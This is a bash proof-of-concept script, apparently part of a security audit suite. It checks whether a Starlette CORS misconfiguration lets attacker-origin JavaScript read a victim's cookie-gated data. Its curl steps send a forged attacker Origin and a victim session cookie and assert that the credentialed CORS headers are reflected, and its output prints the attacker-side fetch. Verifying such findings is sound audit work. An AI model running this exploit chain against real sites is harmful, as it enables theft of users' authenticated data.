#!/usr/bin/env bash
# poc_13_cors_exfil_chain.sh — End-to-end exploit Chain B:
#   CORSMiddleware credentialed-reflection (poc_11 primitive) on a
#   session-cookie-GATED endpoint — attacker-origin JS can read a victim's
#   authenticated data cross-origin via a credentialed fetch.
#
# ── Chain B Kill-chain Summary ─────────────────────────────────────────────────
#
#   Step 0 — Positive control: confirm /cors-protected/whoami terminus is
#             genuinely cookie-gated (401 without cookie; 200 + secret with
#             the correct session cookie).
#   Step 1 — Teeth-test: cookie present but NO Origin → NO
#             Access-Control-Allow-Origin header (CORSMiddleware inert without
#             Origin, cors.py:87-89 — reflection attributable to attacker Origin).
#   Step 2 — Core link (observed): attacker Origin + victim cookie → ACAO
#             reflects attacker Origin + ACAC:true + Vary:Origin + sensitive body.
#   Step 3 — Attacker JS reads the body cross-origin (BROWSER-MODELED — no
#             HTTP request to any attacker host; inevitability argued from
#             Steps 0 + 2 alone).
#
# ── PASS/FAIL semantics (FINDING check — same convention as poc_11/poc_12) ────
#   FAIL = chain confirmed = real finding. PASS = some link did not hold.
#   THIS POC IS EXPECTED TO FAIL ON THIS COMMIT.
#
# ── Marker uniqueness / isolation ─────────────────────────────────────────────
#   All poc_13 markers are DISTINCT from every prior PoC to prevent teeth-test
#   contamination (round-9/14/31 rules):
#     attacker origin  : https://attacker.cors-poc13.example  (not cors-poc11)
#     victim cookie    : AUTOFYN_VICTIM_SESSION_b41d2e        (not _OPERATOR_TOKEN)
#     sensitive marker : AUTOFYN_CORS_EXFIL_SECRET            (not AUTOFYN_CORS_SENTINEL)
#
# ── BROWSER-MODELED discipline ────────────────────────────────────────────────
#   Step 3 does NOT issue any curl request to the attacker origin or any
#   collector host.  A curl-to-dead-collector that passes on connection failure
#   is exploit theater.  Step 3 asserts inevitability solely from the facts
#   observed in Steps 0 and 2.
#
# ── Precondition (PROMINENT — do NOT overstate exploitability) ────────────────
#   CONFIGURATION-DEPENDENT.  Exploitable ONLY when the developer sets BOTH
#   CORSMiddleware(allow_origins=["*"], allow_credentials=True).  Both Starlette
#   defaults are SAFE.  This is a developer foot-gun, NOT a default-config exploit.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/pins.sh
source "${SCRIPT_DIR}/../lib/pins.sh"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

BASE_URL="${1:?Base URL required as \$1}"

ATTACKER_ORIGIN="https://attacker.cors-poc13.example"
VICTIM_COOKIE="session=AUTOFYN_VICTIM_SESSION_b41d2e"
WHOAMI_URL="${BASE_URL}/cors-protected/whoami"

echo "=== poc_13: End-to-End Exploit Chain B — CORS Credentialed Cross-Origin Data Exfil ==="
echo "Chain      : CORSMiddleware credentialed-reflection (poc_11 primitive) on a"
echo "             session-cookie-gated endpoint — attacker-origin JS reads victim's"
echo "             authenticated data cross-origin via a credentialed fetch."
echo "Endpoint   : ${WHOAMI_URL}"
echo "Sink       : starlette/middleware/cors.py (allow_origins=['*'] + allow_credentials=True"
echo "             reflects Origin + ACAC:true) on a cookie-gated terminus."
echo "Precondition: Developer sets allow_origins=['*'] + allow_credentials=True (both"
echo "             Starlette defaults are SAFE — NOT a default-config exploit)."
echo "Severity   : MEDIUM-conditional — cross-origin theft of victim's authenticated data;"
echo "             single-primitive; victim must hold a live session in the same browser."
echo "Expected   : FAIL (chain confirmed = real finding)"
echo ""

NOORIGIN_HAS_ACAO=0
REFLECTED=0
ACAC_TRUE=0
VARY_ORIGIN=0
BODY_SECRET=0

# ─────────────────────────────────────────────────────────────────────────────
# Step 0 — Positive control / non-vacuity: terminus is genuinely cookie-gated
#
# Two sub-checks:
#   (a) GET /cors-protected/whoami with NO cookie, NO Origin → HTTP 401,
#       sensitive marker ABSENT. Proves the endpoint is actually gated.
#   (b) GET /cors-protected/whoami WITH the victim session cookie (no Origin)
#       → HTTP 200, sensitive marker PRESENT.  Proves the credential unlocks
#       real data.
#
# If either sub-check fails, emit "cannot assess chain" and exit 0 (harness
# failure must not be misread as a confirmed exploit).
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 0 — Positive control: confirm /cors-protected/whoami terminus is gated"
echo "──────────────────────────────────────────────────────────────────────────────"

# Sub-check (a): no cookie, no Origin → must be 401, marker absent
echo "--- Step 0a: GET /cors-protected/whoami (no cookie, no Origin) → expect HTTP 401 ---"
S0A_CODE="$(curl -sS -o /tmp/poc13_s0a.txt -w "%{http_code}" \
    --max-time 15 \
    "${WHOAMI_URL}" 2>&1 || echo "000")"
S0A_BODY="$(cat /tmp/poc13_s0a.txt 2>/dev/null || echo "")"
echo "HTTP ${S0A_CODE}"

if [[ "${S0A_CODE}" != "401" ]]; then
    echo "[FAIL] Step 0a: expected 401 without cookie but got HTTP ${S0A_CODE}."
    echo "       /cors-protected/whoami endpoint does not enforce auth — cannot assess chain."
    print_check "cors_credentialed_exfil_chain" "FAIL" \
        "positive control broken (Step 0a): /cors-protected/whoami returned HTTP ${S0A_CODE} without cookie — cannot assess chain"
    rm -f /tmp/poc13_*.txt
    exit 0
fi
if assert_contains "${S0A_BODY}" "AUTOFYN_CORS_EXFIL_SECRET"; then
    echo "[FAIL] Step 0a: sensitive marker present in unauthenticated 401 body."
    echo "       /cors-protected/whoami leaks secret without auth — cannot assess chain."
    print_check "cors_credentialed_exfil_chain" "FAIL" \
        "positive control broken (Step 0a): sensitive marker present in unauthenticated 401 body — cannot assess chain"
    rm -f /tmp/poc13_*.txt
    exit 0
fi
echo "[OK] Step 0a: HTTP 401 without cookie and sensitive marker absent — genuinely gated."
echo ""

# Sub-check (b): with victim session cookie (no Origin) → must be 200 + marker
echo "--- Step 0b: GET /cors-protected/whoami (victim cookie, no Origin) → expect HTTP 200 + marker ---"
S0B_CODE="$(curl -sS -o /tmp/poc13_s0b.txt -w "%{http_code}" \
    --max-time 15 \
    -H "Cookie: ${VICTIM_COOKIE}" \
    "${WHOAMI_URL}" 2>&1 || echo "000")"
S0B_BODY="$(cat /tmp/poc13_s0b.txt 2>/dev/null || echo "")"
echo "HTTP ${S0B_CODE}"

if [[ "${S0B_CODE}" != "200" ]]; then
    echo "[FAIL] Step 0b: correct cookie did not yield 200 (got HTTP ${S0B_CODE})."
    echo "       /cors-protected/whoami broken or cookie mismatch — cannot assess chain."
    print_check "cors_credentialed_exfil_chain" "FAIL" \
        "positive control broken (Step 0b): /cors-protected/whoami returned HTTP ${S0B_CODE} with valid cookie — cannot assess chain"
    rm -f /tmp/poc13_*.txt
    exit 0
fi
if ! assert_contains "${S0B_BODY}" "AUTOFYN_CORS_EXFIL_SECRET"; then
    echo "[FAIL] Step 0b: HTTP 200 but sensitive marker absent from body."
    echo "       /cors-protected/whoami does not return the secret — cannot assess chain."
    print_check "cors_credentialed_exfil_chain" "FAIL" \
        "positive control broken (Step 0b): /cors-protected/whoami returned 200 but sensitive marker absent — cannot assess chain"
    rm -f /tmp/poc13_*.txt
    exit 0
fi
echo "[OK] Step 0b: HTTP 200 + AUTOFYN_CORS_EXFIL_SECRET with correct session cookie."
echo "     The victim session cookie is a valid credential that unlocks real authenticated data."
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Step 1 — Teeth-test (LIVE): credentialed request, NO Origin → NO ACAO
#
# CORSMiddleware is inert when no Origin header is sent (cors.py:87-89).
# If ACAO appears here the environment adds CORS headers unconditionally and
# the reflection cannot be attributed to the attacker Origin → self-downgrade.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 1 — Teeth-test: cookie present, NO Origin → expect NO Access-Control-Allow-Origin"
echo "──────────────────────────────────────────────────────────────────────────────"

S1_HDRS="$(curl -sS -D - -o /tmp/poc13_s1body.txt \
    --max-time 15 \
    -H "Cookie: ${VICTIM_COOKIE}" \
    "${WHOAMI_URL}" 2>&1 || echo "CURL_FAILED")"
echo "Response headers (cookie, no Origin):"
printf '%s\n' "${S1_HDRS}"
echo ""

S1_LC="$(printf '%s' "${S1_HDRS}" | tr '[:upper:]' '[:lower:]')"
if assert_contains "${S1_LC}" "access-control-allow-origin"; then
    NOORIGIN_HAS_ACAO=1
    echo "[WARN] Teeth-test: ACAO present even WITHOUT an Origin header — CORS headers"
    echo "       added unconditionally; cannot attribute reflection to attacker Origin."
    echo "       Self-downgrade to inconclusive."
else
    echo "[OK] Teeth-test: no Access-Control-Allow-Origin emitted without Origin header."
    echo "     Reflection is attributable to the attacker Origin (CORSMiddleware inert)."
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Step 2 — Core link (LIVE): attacker Origin + victim cookie → reflection + body
#
# A request carrying BOTH the attacker Origin AND the victim session cookie must
# produce ALL of:
#   - Access-Control-Allow-Origin: <attacker Origin verbatim>
#   - Access-Control-Allow-Credentials: true
#   - Vary: origin  (proves reflection is Origin-dependent)
#   - Body contains AUTOFYN_CORS_EXFIL_SECRET  (proves gated data was served)
#
# All three headers + the gated body in ONE response is the server-side state
# a browser inspects before releasing a credentialed cross-origin response to
# attacker-origin JS.
#
# Note: MUST use both -D - (header capture) AND -o file (body capture) so that
# the BODY_SECRET assertion can read from the body file, per spec must-fix (a).
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 2 — Core link: attacker Origin + victim cookie → ACAO + ACAC + Vary + gated body"
echo "         Attacker Origin : ${ATTACKER_ORIGIN}"
echo "──────────────────────────────────────────────────────────────────────────────"

S2_HDRS="$(curl -sS -D - -o /tmp/poc13_s2body.txt \
    --max-time 15 \
    -H "Origin: ${ATTACKER_ORIGIN}" \
    -H "Cookie: ${VICTIM_COOKIE}" \
    "${WHOAMI_URL}" 2>&1 || echo "CURL_FAILED")"
S2_BODY="$(cat /tmp/poc13_s2body.txt 2>/dev/null || echo "")"
echo "Response headers (attacker Origin + victim cookie):"
printf '%s\n' "${S2_HDRS}"
echo "Response body: ${S2_BODY}"
echo ""

S2_LC="$(printf '%s' "${S2_HDRS}" | tr '[:upper:]' '[:lower:]')"
ATTACKER_ORIGIN_LC="$(printf '%s' "${ATTACKER_ORIGIN}" | tr '[:upper:]' '[:lower:]')"

# Assert REFLECTED: ACAO == attacker Origin verbatim
if assert_contains "${S2_LC}" "access-control-allow-origin: ${ATTACKER_ORIGIN_LC}"; then
    REFLECTED=1
    echo "[OK] REFLECTED: Access-Control-Allow-Origin reflects the attacker Origin verbatim."
else
    echo "[INFO] REFLECTED: attacker Origin NOT reflected into Access-Control-Allow-Origin."
fi

# Assert ACAC_TRUE
if assert_contains "${S2_LC}" "access-control-allow-credentials: true"; then
    ACAC_TRUE=1
    echo "[OK] ACAC_TRUE: Access-Control-Allow-Credentials: true present."
else
    echo "[INFO] ACAC_TRUE: Access-Control-Allow-Credentials: true NOT present."
fi

# Assert VARY_ORIGIN (strengthening assertion — WARN if absent, not a hard gate)
if assert_contains "${S2_LC}" "vary:"; then
    VARY_CHECK_LC="$(printf '%s' "${S2_LC}" | grep "vary:")"
    if assert_contains "${VARY_CHECK_LC}" "origin"; then
        VARY_ORIGIN=1
        echo "[OK] VARY_ORIGIN: Vary header includes 'origin' — reflection is Origin-dependent."
    else
        echo "[WARN] VARY_ORIGIN: Vary header present but does not include 'origin'."
    fi
else
    echo "[WARN] VARY_ORIGIN: no Vary header — reflection attribution less certain (non-fatal)."
fi

# Assert BODY_SECRET — read from the body file captured by -o /tmp/poc13_s2body.txt
if assert_contains "${S2_BODY}" "AUTOFYN_CORS_EXFIL_SECRET"; then
    BODY_SECRET=1
    echo "[OK] BODY_SECRET: AUTOFYN_CORS_EXFIL_SECRET present in response body."
else
    echo "[INFO] BODY_SECRET: AUTOFYN_CORS_EXFIL_SECRET NOT found in response body."
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Step 3 — BROWSER-MODELED (no HTTP request to any attacker host)
#
# IMPORTANT: This step does NOT issue any curl request to the attacker origin
# or any collector host.  A curl-to-dead-host that passes on connection failure
# is exploit theater and audit-rejection material.  Instead, this step asserts
# the TWO independently-measured facts that together make cross-origin
# authenticated-data exfiltration inevitable under a victim browser:
#
#   (a) Step 2 proved: the server returns ACAO:<attacker Origin> + ACAC:true +
#       the sensitive body for a request carrying the victim credential and the
#       attacker Origin.  Per the Fetch specification's CORS-check algorithm,
#       a browser receiving exactly these headers for a
#       fetch(api, {credentials:'include'}) issued by attacker-origin JS
#       RELEASES the response body to that JS.  This is not a novel claim; it
#       is the defined CORS release rule.
#
#   (b) Step 0 proved: the body is credential-gated (authenticated/sensitive),
#       not publicly readable without the victim session cookie.
#
# Conjunction (a) ∧ (b): attacker-origin JS reads the victim's authenticated
# data cross-origin.  The browser auto-attaches the victim's session cookie on
# a credentials:'include' fetch; the misconfigured ACAO/ACAC lets attacker JS
# read the result.  The final read is MODELED, not executed, because the curl
# harness has no browser and does not hold the victim's session in a browser
# context.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 3 — BROWSER-MODELED STEP (no HTTP request to any attacker host)"
echo "──────────────────────────────────────────────────────────────────────────────"
echo ""
echo "  NOTE: This step asserts inevitability of cross-origin authenticated-data"
echo "  exfiltration from Steps 0 and 2 alone — WITHOUT issuing ANY request to"
echo "  the attacker origin or any collector host.  The cross-origin browser read"
echo "  is MODELED, not executed in this curl harness (no browser, no victim"
echo "  session in browser context)."
echo ""

S3_OK=1

# Assert (a): Step 2 established ACAO == attacker Origin AND ACAC:true AND body present
if (( REFLECTED == 1 )) && (( ACAC_TRUE == 1 )) && (( BODY_SECRET == 1 )); then
    echo "  [OK] (a) Step-2 confirmed: server returns"
    echo "       Access-Control-Allow-Origin: ${ATTACKER_ORIGIN}"
    echo "       Access-Control-Allow-Credentials: true"
    echo "       Body: AUTOFYN_CORS_EXFIL_SECRET (gated by victim session cookie)"
    echo "       for a request carrying the victim session cookie + attacker Origin."
    echo "       Per the Fetch specification CORS-check: a browser receiving these"
    echo "       headers for fetch(api, {credentials:'include'}) from attacker-origin"
    echo "       JS RELEASES the response body to that JS."
else
    echo "  [BLOCKED] (a) Step-2 did not confirm the full CORS-reflection + body link."
    echo "       REFLECTED=${REFLECTED} ACAC_TRUE=${ACAC_TRUE} BODY_SECRET=${BODY_SECRET}"
    S3_OK=0
fi

# Assert (b): Step 0 established the body is credential-gated
if [[ "${S0B_CODE}" == "200" ]] && assert_contains "${S0B_BODY}" "AUTOFYN_CORS_EXFIL_SECRET"; then
    echo "  [OK] (b) Step-0 confirmed: AUTOFYN_CORS_EXFIL_SECRET is accessible ONLY"
    echo "       with the correct session cookie (401 without it; 200 with it)."
    echo "       The response body is authenticated/sensitive — not publicly readable."
else
    echo "  [BLOCKED] (b) Step-0 did not confirm credential gate — sensitive data"
    echo "       authenticity not established."
    S3_OK=0
fi

echo ""
if [[ "${S3_OK}" == "1" ]]; then
    echo "  [BROWSER-MODELED] (a) ∧ (b): under a victim browser, attacker-origin JS at"
    echo "  ${ATTACKER_ORIGIN} issuing:"
    echo "    fetch(\"${WHOAMI_URL}\", {credentials:\"include\"})"
    echo "  would cause the browser to:"
    echo "    1. Attach the victim's session cookie automatically (credentials:'include')."
    echo "    2. Receive ACAO:${ATTACKER_ORIGIN} + ACAC:true from the server."
    echo "    3. Release the response body — containing AUTOFYN_CORS_EXFIL_SECRET —"
    echo "       to the attacker-origin JS (Fetch spec CORS-check satisfied)."
    echo ""
    echo "  The victim's authenticated data is thereby read cross-origin by attacker JS."
    echo "  No request was issued to the attacker host in this PoC.  The cross-origin"
    echo "  body read is BROWSER-MODELED and labeled as such."
    echo "  Live-confirmed parts: Steps 0, 1, 2.  Step 3 is browser-modeled."
else
    echo "  [BLOCKED] One or more Step-3 assertions failed — browser-modeled exfil"
    echo "  path cannot be argued from current evidence."
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Final verdict
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Final verdict"
echo "──────────────────────────────────────────────────────────────────────────────"

if (( NOORIGIN_HAS_ACAO == 1 )); then
    # Reflection cannot be attributed to the attacker Origin — downgrade.
    print_check "cors_credentialed_exfil_chain" "PASS" \
        "inconclusive: Access-Control-Allow-Origin emitted even without an Origin header — CORS headers added unconditionally in this environment; cannot attribute reflection to the attacker Origin"

elif (( REFLECTED == 1 )) && (( ACAC_TRUE == 1 )) && (( BODY_SECRET == 1 )); then
    # Full chain confirmed: gated terminus + ACAO reflection + ACAC:true + body present.
    print_check "cors_credentialed_exfil_chain" "FAIL" \
        "Chain B confirmed (browser-modeled qualifier): /cors-protected/whoami is session-cookie-gated (401 without cookie; 200+AUTOFYN_CORS_EXFIL_SECRET with cookie); with attacker Origin ${ATTACKER_ORIGIN} + victim cookie the response reflects Access-Control-Allow-Origin: ${ATTACKER_ORIGIN} + Access-Control-Allow-Credentials: true (+ Vary: Origin) AND returns the authenticated body — exactly the state a browser checks before releasing a credentialed cross-origin response to attacker JS. Under a victim browser, attacker-origin JS fetch(...,{credentials:'include'}) reads the victim's authenticated data cross-origin (BROWSER-MODELED step — not executed in this curl harness; no request issued to any attacker host). Live-confirmed: Steps 0/1/2; Step 3 browser-modeled. Unauth remote attacker to victim authenticated-data exfil. Conditional on allow_origins=['*'] + allow_credentials=True (both Starlette defaults safe). starlette/middleware/cors.py:167-168 to :177-178; upstream-inherited."

else
    # Build a diagnostic detail naming which arm broke.
    FAIL_DETAIL="Chain B incomplete — link(s) did not hold:"
    if [[ "${S0B_CODE}" != "200" ]]; then
        FAIL_DETAIL="${FAIL_DETAIL} Step-0 terminus broken (HTTP ${S0B_CODE} with valid cookie);"
    fi
    if (( REFLECTED == 0 )); then
        FAIL_DETAIL="${FAIL_DETAIL} Step-2 REFLECTED not confirmed (attacker Origin not in ACAO);"
    fi
    if (( ACAC_TRUE == 0 )); then
        FAIL_DETAIL="${FAIL_DETAIL} Step-2 ACAC_TRUE not confirmed (Access-Control-Allow-Credentials: true absent);"
    fi
    if (( BODY_SECRET == 0 )); then
        FAIL_DETAIL="${FAIL_DETAIL} Step-2 BODY_SECRET not confirmed (AUTOFYN_CORS_EXFIL_SECRET absent from body);"
    fi
    print_check "cors_credentialed_exfil_chain" "PASS" \
        "${FAIL_DETAIL} defense or precondition broke the chain"
fi

# ─────────────────────────────────────────────────────────────────────────────
# Cleanup
# ─────────────────────────────────────────────────────────────────────────────
rm -f /tmp/poc13_*.txt
